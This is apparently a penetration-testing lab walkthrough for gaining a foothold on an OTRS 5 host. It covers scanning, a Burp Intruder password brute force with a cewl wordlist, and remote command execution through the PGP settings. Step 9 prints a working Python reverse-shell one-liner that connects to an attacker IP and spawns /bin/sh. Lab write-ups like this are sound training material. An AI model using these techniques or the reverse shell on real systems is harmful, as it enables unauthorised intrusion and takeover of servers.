Getting a Foothold

Getting a Foothold

# 1. NMAP Scan
TCP Connect scan with service detection.
`sudo nmap -sV -sT -p- 10.11.1.39`
![3efaafcd148fcac8ba02c3288a34a62b.png](f8045ccbb06a4adabda5ead8c4cc3929.png)

# 2. Enumerate the web server using dirb.
`dirb http://10.11.1.39 -r`
![2f65750b4fe1520c311b45c35d09e0f4.png](7a494dc4e339475891027b5fd2fd5bac.png)

# 3. There is a robots.txt file that redirects to bad.txt. Investigate this later
[http://10.11.1.39/bad.txt](http://10.11.1.39/bad.txt)
![aa39da83e52bae2d3056cc593e4cabb3.png](dcf89e8864ba49a2aada04fe2dcaef58.png)

# 4. Scan the web server with Nikto. Of interest is the references to /otrs/index.pl
`nikto -h http://10.11.1.39`
![ff643a214d093979023775e218713c96.png](8dd297fcea0243378094f06490f23f66.png)

Notice that Nikto outputs the version of OTRS
![b92691e3c8fe58cb252f1bcd2ceb66ae.png](bb805a92a37f41e5bc4c8309160531b9.png)


# 5. Browse to /otrs/index.pl
[http://10.11.1.39/otrs/index.pl](http://10.11.1.39/otrs/index.pl)
![a2be1a88aa6c96a7d343d1b879a58f8c.png](044fef037dc3497a9803eb36a70ded90.png)

# 6. Login to OTRS 5 as root@localhost
The default credentials root@localhost:root do not work.

## Use Cewl to create a custom wordlist of possible passwords
`cewl -m 4 -w cewl_otrs.txt http://10.11.1.39/otrs/index.pl`
![c13026bb61bbb4ad400648e721cc6d88.png](963b972782704715a670e3842284c807.png)
Attached is the wordlist:
[cewl_otrs.txt](3bf084feb45f48bca3aeaaa176faf6d2.txt)

## Use Burpsuite
Open Burpsuite and start a temporary project
![94b99d341fac39a63bb8b2a4ffe0ac4e.png](b39e9a42775242a7990a3ab8ee78e7bd.png)

Use Burp defaults, and Start Burp
![b4a48344c67305ceaae2e9c0b56243dd.png](d24cfde1b92e42a5b2993dfd85c3048f.png)

Click on Proxy, then the HTTP History tab
![bc49350b3442efdde3fde876c24eb5c2.png](e472125c69e7407b803f8c1229d16c06.png)

Open a new browser, and ensure that FoxyProxy is on for Burp
![b526a1baf5e568073216680f1dd07c53.png](27f740c86c484f08b6129e5b5fa45121.png)

Browse to the /otrs/index.pl login page
`http://10.11.1.39/otrs/index.pl`
![8fcf863712440d68219062654806ebbe.png](b46632d636314e9fbc4fd6b01194892f.png)

On the browser, enter any credentials, in this example we will use admin:admin, then press the Login Button. We expect this to fail.
![763a5b0612e70b1e1eece5acd1696cbc.png](c34fd6b7e6ac43cfb318b7cc57d1e771.png)

Go back to Burp, and find the POST request we had used to login to admin:admin
![bdbb6ff9e7ace2941e720d1048385536.png](8830bc250cb24fabaaf7f6e46f3a121f.png)

Send the POST request to the Intruder. Then view the Positions tab
![04de1811b10d490d0b783581b52e5326.png](d0cf061963554eb09c398146cab5c9a1.png)

Clear all payload markers
![5f7b472fcab5be917ba11a8602a8f114.png](bf9d6831ccaa4b56bd2ffbcbf338746f.png)

Change the User to root@localhost, and insert a new payload marker for the password value
![79e81b1fd37456dab991d9a3ea3d9efe.png](dd0faae399b7479bb9f4bfc96ae83109.png)

Click the Payloads tab. On the Payloads Options (Simple List) form, copy the words we had gotten from the cewl command, and paste them into the form
![f6b1d8936f274467ab1c95cad2d02d5e.png](fa2b40285a9d40f5b2435e14f15d81d5.png)
![ff592f2652bd37c8ab654e826c07d430.png](79d88f7d42364f708cd7fe7942695da6.png)

Press the Start Attack Button
![f565343512bd838836634ac029d810df.png](c844089a288b4e2bb8e94a7ff3c22826.png)

Press OK if the following window pops up
![c3f3c612e0a032c5ce967161505d5bcc.png](6f3e63990fe44f60adeb06959b5e3e7b.png)

View the results
![64df6f92deb51466b4542b97009b32f3.png](86a64bc3915648c2a571e8fda0e89024.png)

Notice that of all the requests, 'otrs' has a different Length than the rest.
![8b78b3691b46f0e07694a80e8317cbc1.png](eabe24d976e443ff8b1a2447d76f5b4a.png)

Login to /otrs/index.pl using creds root@localhost:otrs
![5a78bb0d1facf841599e3a63ff0de249.png](058f0851f4db4acca8261718c2717c78.png)

We are logged in!
![0257eccf4a76ba8fb2fc5f03a7ecbea2.png](ed321fb2d36147c58ddbb775e407d355.png)

# 7. Change from Swedish language to English
Upon login, we see it's not in English
![9e7774c5ba353b1eab61f5d96a96f94f.png](e207941b60dd49e2b2fe1cf10559256e.png)

It's in Swedish language
![2b58add65d1f0631c6498776817e95bc.png](07003a222e4047aa93c9389b48c7e7a5.png)

Choose English
![f78299ef0c6639f63c8cfbdcd2c16080.png](618105db284a4ffd95ec8d7916914be4.png)

Verify it's in English
![71b70bd91d1358016892807e43e92b21.png](a15d17de30684baaa73a4bb9509434d1.png)


# 8. Search for an exploit for OTRS 5.0.2 
`searchsploit otrs`
![41eff9e8b85674b3425d864eaa8863f4.png](b755a4da0ba6407c93c1ae6a2794717f.png)

There is an exploit for remote comman execution, let's download that.
`searchsploit -m 43853`
![6d86c3d7f8ae22891ede56418d7656f8.png](7a189ca32b9947778eeff55492e0460c.png)

Exploit 43853 looks like this:
`cat 43853.txt`
![8e4d50a6a7491537bad8cda1a7ef142f.png](1c52c0261f6846c5a47599cb8098cb9e.png)

# 9. Attempt to exploit using 43853.txt
Open the Admin tab
![04cc8cb38b2a7a6b8a7ffae7a389a9e1.png](d13faee5fe6b4475b3d85f07d721e326.png)
![afce964feee78355d8a89823673423c1.png](9f85bd806ebf43df8fc73c4467f461c9.png)

Open the SysConfig
![1eeb8a43dfcd09ad55dd58aa3fa1d902.png](2d0171797af940ba9c6d01b445f527ee.png)

Find the "Crypt:PGP" subgroup by inputting 'PGP' in the Navigate settings
![acb0a6448d808446299c39686e7a1c28.png](870476f003dd42bca8ce5538bb494843.png)

Update PGP to 'Yes'
![323627e310942d24b6ed6afc5ae5a00b.png](1b3ba2432ff24591a9d4a5e988b74e18.png)

Update PGP::Bin (use the attack IP and port 5678 to:
`/usr/bin/python`
![dce95f0109f21742d457f43702926604.png](9efd8839ae8f4b06a04ccce20b5a34ca.png)


Update PGP::Options (you must attacker IP and port 5678)
`-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.214",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
![fd8ed4d38b94e2717a41a5812dec2312.png](49110add940448b29712611dfd60217a.png)
It's in the exploit, but I also got it from pentest monkey
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Open the Admin tab again
![5ab2c2baedafc3f0dbf9882e33493e13.png](a804b9b6dc1f4cab8982eca3fb00e4ea.png)

Open a netcat listener port 5678
![6adad7b320a98d350c351cbb6fb7fdbf.png](6b81664936f04ba6bf9b5d142fad7c3b.png)

Execute the code by browsing to
[10.11.1.39/otrs/index.pl?Action=AdminPGP](10.11.1.39/otrs/index.pl?Action=AdminPGP)
![26c2dcc3ab8e488fdabd366c37ba168a.png](9cf3e77020bb4b218dd04a3dc665b171.png)


The feature is disabled! Enable it. It has reset what we did. Let's do it again.
Press update.

Now browse back to 
[10.11.1.39/otrs/index.pl?Action=AdminPGP](10.11.1.39/otrs/index.pl?Action=AdminPGP)

We have a shell!
![e78701d6ec73d432188df5313538afcd.png](053083f7f6cb4179ad8872e67a870321.png)

We are username apache
![8bf0b272e9f912439e2a6ed14f5d1d4d.png](6ee5061f5b1b472aadfd49fe433e5aab.png)